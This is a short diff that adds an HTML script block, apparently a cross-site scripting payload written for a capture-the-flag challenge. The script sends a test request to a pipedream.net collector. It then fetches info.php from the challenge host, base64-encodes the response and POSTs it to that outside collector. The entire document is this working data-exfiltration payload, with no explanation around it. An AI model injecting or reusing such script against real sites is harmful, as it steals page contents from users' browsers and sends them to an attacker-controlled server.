@@ -1,0 +1,19 @@
+<script>
+    function sendRequest(meth, url, data="") {
+        let xhr = new XMLHttpRequest();
+        xhr.open(meth, url)
+        xhr.send(data)
+        return xhr.responseText
+    }
+
+    /*test*/
+    let url = "https://eocvkn4m3kpce3q.m.pipedream.net/"
+    sendRequest('GET', url)
+
+    /* retrive info.php*/
+    info = sendRequest('GET', 'http://idek-hello.chal.idek.team:1337/info.php')
+
+    /* send the retrieved content */
+    sendRequest('POST', url, data="content="+btoa(info))
+
+</script>
